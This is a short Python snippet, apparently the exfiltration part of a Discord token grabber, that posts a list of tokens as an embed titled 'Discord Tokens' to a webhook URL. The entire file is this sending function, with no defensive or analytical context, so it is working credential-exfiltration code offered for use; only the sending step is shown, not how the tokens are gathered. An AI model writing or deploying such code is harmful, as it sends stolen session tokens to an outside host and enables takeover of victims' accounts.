import requests

def send_tokens_via_webhook(tokens, webhook_url):
    if not tokens:
        return False

    data = {
        "content": "",
        "embeds": [
            {
                "title": "Discord Tokens",
                "description": "\n".join(tokens),
                "color": 3447003
            }
        ]
    }

    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        return True
    else:
        return False